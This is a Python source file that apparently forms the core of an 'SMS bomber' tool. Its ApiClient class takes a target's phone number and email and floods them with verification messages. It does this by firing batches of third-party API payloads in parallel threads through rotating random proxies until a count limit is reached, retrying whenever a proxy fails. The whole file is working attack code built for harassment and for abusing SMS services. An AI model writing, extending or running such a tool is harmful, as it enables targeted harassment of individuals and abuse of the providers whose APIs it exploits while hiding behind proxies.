import requests
import threading

from api import Sms
from api.check import Checker
from api.check.custom_check import CustomChecker
from api.logger import Logger
from api.payloads_manager import PayloadsManager
from api.payloads_manager.custom_payloads import CustomPayloads


class ApiClient(Sms):
    """Manager of SMS APIs and SMS bomber."""

    def __init__(self, phone, mail, count_limit):
        """Initialize the API client with phone number, email, and SMS count."""
        self.phone = phone
        self.mail = mail
        self.count = 0
        self.count_limit = count_limit
        self.payloads_manager = PayloadsManager(self.phone, self.mail)
        self.custom_payloads = CustomPayloads(self.phone, self.mail)
        self.checker = Checker()
        self.custom_checker = CustomChecker(self.phone, self.mail)

    def payload_select(self):
        size = self.k*self.THREADS_PER_PHONE
        payloads_count = len(self.payloads_manager.confd_payloads) 
        
        if size > payloads_count:
            l = size - payloads_count
            s = size - l - 1
            selecteds = self.payloads_manager.confd_payloads[s:]
            self.k = 0 
        
            return selecteds

        l1, l2 = (self.k-1)*self.THREADS_PER_PHONE, self.k*self.THREADS_PER_PHONE
        selecteds = self.payloads_manager.confd_payloads[l1:l2]

        return selecteds

    def worker(self):
        self.k = 0

        while self.count < self.count_limit:            
            self.k += 1
            selected_payloads = self.payload_select()

            threads = []
            for payload in selected_payloads:
                thread = threading.Thread(target=self.send, args=(payload,), daemon=True)
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

    def send(self, payload):
        """Send SMS using the specified payload, method, and algorithm."""
        method = payload[PayloadsManager.METHOD_SELECTOR]
        algorithm = payload[PayloadsManager.ALGORITHM_SELECTOR]
        rnd_proxy = Sms.random_select_proxy()
        req_args = payload[PayloadsManager.PAYLOAD_ARGS_SELECTOR]
        name = payload[PayloadsManager.NAME_SELECTOR]
        log_args = (name, self.phone, rnd_proxy)

        method_name = payload.get(PayloadsManager.METHOD_NAME_SELECTOR, False)

        try:
            response_obj = self._method_call(req_args, method, method_name, rnd_proxy)
            result = self._check_call(payload, algorithm, response_obj)
            if not result:
                raise Exception("Could not send")
        except requests.exceptions.ProxyError:
            # If proxy does not work, retry.
            Sms.free_usening_proxy(rnd_proxy)
            return self.send(payload)
        except Exception as e:
            Logger.print_result(False, *log_args, self.count)
            # Timeout error, etc. means API did not work.
        else:
            Sms.total_count += 1
            self.count += 1
            Logger.print_result(True, *log_args, self.count)

        Sms.free_usening_proxy(rnd_proxy)

    def _method_call(self, req_args, method, method_name, rnd_proxy):
        """Make the API request using the specified method, args, and proxy."""
        if method != PayloadsManager.MTD_CUSTOM:
            exec_dir = {"req_args": req_args, "rnd_proxy": rnd_proxy}
            command = f"response_obj = __import__('requests').{method}(**req_args, proxies=rnd_proxy)"
            exec(command, exec_dir)
            response_obj = exec_dir["response_obj"]
        else:
            method_name = method_name + CustomPayloads.CUSTOM_PAYLOADS_FUNC_REPRESENT
            custom_payload = getattr(self.custom_payloads, method_name)
            response_obj = custom_payload(rnd_proxy)

        return response_obj

    def _check_call(self, payload, algorithm, response_obj):
        """Check the result of the SMS bomb using the specified algorithm."""
        if algorithm == PayloadsManager.ALG_JSON:
            path = payload[PayloadsManager.VALIDATE_PATH_SELECTOR]
            validate_data = payload[PayloadsManager.VALIDATE_DATA_SELECTOR]
            return self.checker.json_check(response_obj, validate_data, path)

        elif algorithm == PayloadsManager.ALG_STATUS_CODE:
            validate_code = payload[PayloadsManager.VALIDATE_DATA_SELECTOR]
            return self.checker.status_code_check(response_obj, validate_code)

        elif algorithm == PayloadsManager.ALG_CUSTOM:
            method_name = payload[PayloadsManager.METHOD_NAME_SELECTOR] + CustomChecker.CUSTOM_CHECK_FUNC_REPRESENT
            custom_check = getattr(self.custom_checker, method_name)
            return custom_check(response_obj)
